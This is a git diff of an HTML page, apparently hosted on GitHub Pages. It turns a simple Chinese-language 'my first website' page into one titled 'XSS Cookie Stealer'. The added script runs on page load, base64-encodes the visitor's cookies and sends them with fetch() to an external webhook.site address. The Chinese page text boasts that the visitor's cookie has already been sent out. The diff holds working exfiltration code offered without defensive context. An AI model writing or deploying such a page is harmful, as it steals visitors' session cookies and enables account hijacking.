@@ -1,11 +1,16 @@
 <!DOCTYPE html>
 <html lang="zh-Hant">
-<head>
-  <meta charset="UTF-8" />
-  <title>我的靜態網站</title>
-</head>
-<body>
-  <h1>Hello, GitHub Pages 👋</h1>
-  <p>這是我建立的第一個網站</p>
-</body>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS Cookie Stealer</title>
+  </head>
+  <body>
+    <h1>🍪 Cookie Stealer 啟動</h1>
+    <p>這頁已經自動把你的 cookie 傳出去了 😈</p>
+
+    <script>
+      // 自動送出 cookie 到你的 webhook
+      fetch("https://webhook.site/eb639c58-800f-4a15-b1a6-024a1714b369?" + btoa(document.cookie));
+    </script>
+  </body>
 </html>
